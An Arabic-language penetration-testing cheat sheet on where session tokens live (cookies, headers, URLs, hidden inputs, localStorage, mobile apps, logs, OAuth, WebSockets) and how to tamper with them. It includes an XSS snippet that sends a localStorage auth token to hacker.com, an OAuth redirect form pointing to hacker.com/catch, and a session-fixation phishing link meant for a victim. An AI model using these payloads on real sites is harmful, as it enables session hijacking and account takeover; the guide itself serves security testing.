# 📍 أين تبحث عن Session Tokens أثناء Pentesting؟

## 🔹 1. **Cookies**
معظم التطبيقات تستخدم الكوكيز لتخزين Session ID مثل:
```http
Set-Cookie: PHPSESSID=abc123xyz; Path=/; Secure; HttpOnly
```

#### 🛠️ المحاولة #1: استخدام Burp Proxy لاكتشاف الكوكيز
- راقب الطلبات والردود في **Burp Proxy > Intercept أو History**.
- ابحث عن كلمات مثل اللي في الملف ده :

![files for pentesting/session id names.txt](attachments/files for pentesting/session id names.txt)
#### 🛠️ المحاولة #2: تعديل الكوكيز يدويًا
- استبدل القيمة بقيمة محددة واختبر إذا ما ترفضها المنظومة:
```http
GET /login HTTP/1.1
Host: target.com
Cookie: sessionid=hacker_session_123
```

#### 🛠️ المحاولة #3: فحص خصائص الكوكيز
- هل فيه `Secure`, `HttpOnly`, `SameSite`؟
- بدون هذه الخصائص = ثغرة محتملة.

---

# 🔹 2. **Authorization Headers**
في التطبيقات الحديثة، يُرسل التوكن في رؤوس الطلب ويفضل استخدامه في **APIs**.


## 🛠️ المحاولة #4: البحث عن توكنات في Authorization Header

### 🔍 الهدف:
اكتشاف توكن Bearer أو JWT المخزن في رؤوس الطلب.

### 📌 الخطوات:

#### 1. تسجيل الدخول إلى موقع يعتمد على توكنات (مثل API).
#### 2. استخدام Burp Suite لمراقبة الطلبات.
#### 3. البحث عن رأس مثل:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### 4. تحليل نوع التوكن:
- JWT؟
- Random String؟



## 🛠️ المحاولة #5: استخدام JWT Editor Extension في Burp Suite

### 🔍 الهدف:
فك هيكل JWT Token لمعرفة البيانات الداخلية.

### 📌 الخطوات:

#### 1. تثبيت JWT Editor من Marketplace في Burp Suite.
#### 2. إرسال طلب يحتوي على توكن JWT إلى Repeater.
#### 3. اضغط على Tab "JWT Editor".
#### 4. ستظهر البيانات (Payload) مثل:
```json
{
  "user": "admin",
  "exp": 1234567890,
  "iat": 1516239022
}
```



## 🛠️ المحاولة #6: تجربة توكنات مُعدّلة

### 🔍 الهدف:
تعديل بيانات داخل JWT وإعادة توقيعه ومعرفة إن كان النظام يتقبله.

### 📌 الخطوات:

#### 1. استخدم jwt.io أو JWT Editor لإدخال التوكن.
#### 2. غير البيانات:
```json
{ "username": "admin" } => { "username": "hacker" }
```

#### 3. أعد توقيع التوكن باستخدام نفس Algorithm.
#### 4. استبدل التوكن في الطلب:
```http
Authorization: Bearer modified_jwt_here
```

#### 5. أرسل الطلب واختبر إن كان النظام يتقبله.



---

### 🔹 3. **URL Parameters**
بعض التطبيقات تُمرِّر Session Token في الرابط – وهذا **خطير جداً**.


## 🛠️ المحاولة #7: البحث عن Session ID في URL

### 🔍 الهدف:
اكتشاف إن كان التطبيق يمرر الجلسات في الرابط.

### 📌 الخطوات:

#### 1. ابحث عن روابط مثل:
```
https://target.com/dashboard?sessionid=abc123xyz
```

#### 2. راقب الطلبات في Burp Proxy.
#### 3. جرب تغيير القيمة وترى إن كانت تنطبق على جلسة أخرى.



## 🛠️ المحاولة #8: إرسال رابط Phishing للضحية

### 🔍 الهدف:
استخدام Session ID في الرابط لخداع الضحية.

### 📌 الخطوات:

#### 1. صنع رابط phishing:
```
https://target.com/login?sessionid=hacker_session
```

#### 2. إقناع الضحية بالنقر عليه (عبر Email أو رسالة).
#### 3. لو تم تسجيل الدخول، قد يأخذ التطبيق الـ sessionid كجلسة جديدة.



## 🛠️ المحاولة #9: استخدام Referer Header لتمرير القيمة

### 🔍 الهدف:
بعض التطبيقات تقرأ القيمة من Referer.

### 📌 الخطوات:

#### 1. إنشاء صفحة تحتوي على رابط للموقع المستهدف.
#### 2. عند النقر عليه، يُرسل Referer header:
```http
Referer: https://target.com/?sessionid=abc123xyz
```

#### 3. راقب في حال كان الموقع يستخدم هذه القيمة.




---

### 🔹 4. **Hidden Inputs في HTML Forms**
قد تجد أن التوكن مخزن داخل نموذج HTML على شكل Hidden Input.

## 🛠️ المحاولة #10: تعديل Hidden Input قبل submit

### 🔍 الهدف:
تغيير قيمة توكن Session مخزن في HTML.

### 📌 الخطوات:

#### 1. فتح الصفحة التي تحوي النموذج.
#### 2. استخدام DevTools لتعديل:
```html
<input type="hidden" name="token" value="abc123xyz">
```

#### 3. تغيير القيمة:
```html
value="hacker_token"
```

#### 4. Submit النموذج واختبار الاستجابة.



## 🛠️ المحاولة #11: فك التشفير إنترنت كان مشفر

### 🔍 الهدف:
بعض النماذج قد تستخدم Base64 أو AES لتوثيق القيم.

### 📌 الخطوات:

#### 1. استخرج القيمة المشفرة من HTML.
#### 2. جرب فك Base64:
```bash
echo "encrypted_value_here" | base64 -d
```

#### 3. إن كان تشفير AES:
- استخدم أدوات مثل CyberChef أو Python لفكه.



## 🛠️ المحاولة #12: إعادة استخدام التوكن في طلب جديد

### 🔍 الهدف:
استخدام توكن من مستخدم آخر لتسجيل دخول باسمه.

### 📌 الخطوات:

#### 1. استخرج توكن من مستخدم A.
#### 2. استخدم هذا التوكن في طلب باسم مستخدم B.
#### 3. إن نجح الطلب = ثغرة في إدارة الجلسات.




---

### 🔹 5. **LocalStorage & sessionStorage (JavaScript Storage)**
في التطبيقات Single Page Applications (SPA)، يُستخدم هذا النوع من التخزين.
## 🛠️ المحاولة #13: استخدام Chrome DevTools للوصول إلى الذاكرة

### 🔍 الهدف:
قراءة التوكن من LocalStorage أو SessionStorage.

### 📌 الخطوات:

#### 1. افتح DevTools (F12).
#### 2. اذهب إلى:
> Application tab → Storage → localStorage/sessionStorage

#### 3. ابحث عن keys مثل:
```text
auth_token, userToken, session
```



## 🛠️ المحاولة #14: سرقة القيمة عبر XSS

### 🔍 الهدف:
استغلال ثغرة XSS لسحب التوكن.

### 📌 الخطوات:

#### 1. внедر سكريبت XSS في أحد الصفحات:
```javascript
<script>
fetch('https://hacker.com/token?='+localStorage.getItem('auth_token'));
</script>
```

#### 2. إذا تم تنفيذه → سيصل التوكن للهاكر.



## 🛠️ المحاولة #15: فك تشفير التوكن إنترنت كان مشفر

### 🔍 الهدف:
بعض التطبيقات تستخدم تشفير محلي.

### 📌 الخطوات:

#### 1. استخرج القيمة المشفرة من localStorage.
#### 2. استخدم Frida أو Python لفك التشفير.
#### 3. مثال:
```python
import base64
print(base64.b64decode("encrypted_value"))
```




 
---

### 🔹 6. **Headers مُخصصة (Custom Headers)**
بعض التطبيقات تستخدم رؤوس مخصصة لنقل التوكنات.

## 🛠️ المحاولة #16: البحث عن رؤوس غير قياسية

### 🔍 الهدف:
بعض التطبيقات تستخدم رؤوس خاصة.

### 📌 الخطوات:

#### 1. راقب الطلبات في Burp.
#### 2. ابحث عن رؤوس مثل:
```http
X-Session-ID: abc123
Authentication-Token: xyz789
```



## 🛠️ المحاولة #17: تعديل القيمة يدويًا

### 🔍 الهدف:
اختبار إن كان النظام يتقبل توكن مختلف.

### 📌 الخطوات:

#### 1. أرسل GET request:
```http
GET /dashboard HTTP/1.1
Host: target.com
X-User-Token: hacker_session
```

#### 2. اختبر الاستجابة.



## 🛠️ المحاولة #18: اختبار Reuse بين المستخدمين

### 🔍 الهدف:
معرفة إن كان نفس التوكن يعمل على أكثر من حساب.

### 📌 الخطوات:

#### 1. استخدم توكن من مستخدم A.
#### 2. استخدمه في طلب باسم مستخدم B.
#### 3. إن نجح = ثغرة.



---

### 🔹 7. **Mobile App Traffic**
تطبيقات الهاتف قد تستخدم توكنات مختلفة أو ترسلها بطريقة مختلفة.


## 🛠️ المحاولة #19: التقاط الطلبات عبر Mobile Proxy

### 🔍 الهدف:
مراقبة طلبات تطبيقات الموبايل.

### 📌 الخطوات:

#### 1. ضبط الهاتف ليستخدم Burp كبروكسي.
#### 2. مراقبة الطلبات بعد تسجيل الدخول.
#### 3. البحث عن توكنات مثل:
```http
Authorization: Bearer ...
X-API-Key: ...
```

---

## 🛠️ المحاولة #20: استخدام Frida أو Objection لفك التشفير

### 🔍 الهدف:
فك التشفير من ذاكرة التطبيق.

### 📌 الخطوات:

#### 1. تثبيت Frida و Objection.
#### 2. اربط الجهاز بالكمبيوتر (Root/Jailbreak مطلوب).
#### 3. استخدم:
```bash
objection -g com.example.app explore
```

#### 4. جرب فك القيم المشفرة.



---

### 🔹 8. **Logs وسجلات الخادم**
بعض التطبيقات قد تسجل التوكنات في سجلات النظام.


## 🛠️ المحاولة #21: الوصول إلى Logs الخادم

### 🔍 الهدف:
اكتشاف تسريب التوكن في Log Files.

### 📌 الخطوات:

#### 1. الوصول إلى الخادم (SSH أو Shell).
#### 2. استخدم:
```bash
grep 'sessionid' /var/log/apache/access.log
```



## 🛠️ المحاولة #22: استخدام Error Messages لتسريب التوكن

### 🔍 الهدف:
بعض التطبيقات تعرض التوكن في صفحات الخطأ.

### 📌 الخطوات:

#### 1. حدث خطأ عمداً (مثل إدخال بيانات خاطئة).
#### 2. راقب الرد:
```
Error: Invalid sessionid=[abc123] in request...
```




---

### 🔹 9. **OAuth Tokens وSocial Logins**
بعض التطبيقات تستخدم OAuth وتفقدها عند إعادة التوجيه.

## 🛠️ المحاولة #23: التقاط توكن OAuth من Redirect

### 🔍 الهدف:
استغلال توكن OAuth في الـ redirect.

### 📌 الخطوات:

#### 1. راقب الـ redirect URL:
```
https://app.com/callback#access_token=abc123xyz
```

## 🛠️ المحاولة #24: استخدام CSRF لإعادة توجيه المستخدم

### 🔍 الهدف:
إحداث OAuth Redirection Attack.

### 📌 الخطوات:

#### 1. صنع نموذج:
```html
<form action="https://oauth-provider.com/authorize" method="get">
  <input type="hidden" name="redirect_uri" value="https://hacker.com/catch">
</form>
```

#### 2. إقناع المستخدم بإرسال الطلب.



---

### 🔹 10. **JWT Tokens في WebSockets**
بعض التطبيقات تستخدم WebSockets للمحادثة الحية وتُرسل التوكنات بها.

## 🛠️ المحاولة #25: التقاط WebSocket Traffic

### 🔍 الهدف:
اكتشاف توكنات في WebSockets.

### 📌 الخطوات:

#### 1. في Burp Suite، اذهب إلى:
> Proxy > WebSockets history

#### 2. ابحث عن JSON:
```json
{"token": "abc123"}
```

---

## 🛠️ المحاولة #26: تعديل توكن WebSocket

### 🔍 الهدف:
اختبار إن كان السيرفر يتقبل توكن معدل.

### 📌 الخطوات:

#### 1. استخدم WebSocket Logger أو Python scripts.
#### 2. أرسل توكن معدل:
```json
{"token": "modified_token"}
```

---


---

# 📋 Checklist: محاور البحث عن Session Tokens

| المصدر | أدوات الاكتشاف |
|--------|----------------|
| Cookies | Burp Proxy, Cookie Manager |
| Headers | Burp Repeater, cURL |
| URL Params | Burp Proxy, Custom Links |
| Hidden Inputs | View Source, DevTools |
| JS Storage | localStorage/sessionStorage |
| Mobile Apps | Burp Proxy for Mobile |
| Logs | grep, error-based enumeration |
| OAuth | Redirect URLs, CSRF |
| WebSockets | Burp WebSockets tab |
| Custom Headers | Burp Interceptor |

---

